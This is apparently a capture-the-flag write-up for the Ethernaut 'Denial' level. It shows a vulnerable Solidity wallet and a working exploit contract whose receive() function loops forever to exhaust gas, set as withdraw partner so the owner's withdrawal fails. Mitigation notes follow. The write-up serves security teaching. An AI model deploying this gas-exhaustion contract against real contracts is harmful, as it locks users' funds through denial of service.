# 20. Denial
<sup>Difficulty 5/10</sup>

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

## Solution

We need to create a Denial of Service and negate the withdraw function.

```solidity
// withdraw 1% to recipient and 1% to owner
function withdraw() public {
    uint amountToSend = address(this).balance.div(100);
    // perform a call without checking return
    // The recipient can revert, the owner will still get their share
    partner.call{value:amountToSend}("");
    owner.transfer(amountToSend);
    // keep track of last withdrawal time
    timeLastWithdrawn = now;
    withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
}
```

The first transfer performed is in favor of a `partner` and uses the `call` function. We can set the `partner` via the `setWithdrawPartner` function.

```solidity
function setWithdrawPartner(address _partner) public {
    partner = _partner;
}
```

Nothing easier. Create a simple contract that exhaust the gas in the fallback function, and deploy it.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Denial {
    receive() external payable {
        while (true) {}
    }
}
```

Then set the partner and submit the instance

```javascript
await contract.setWithdrawPartner('0xA131a41B7ac24244e3E03478Ed8772995B101Cb0')
```

```
☜Ҩ.¬_¬.Ҩ☞ Well done, You have completed this level!!!
```

## OZ Corner

This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.

Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.
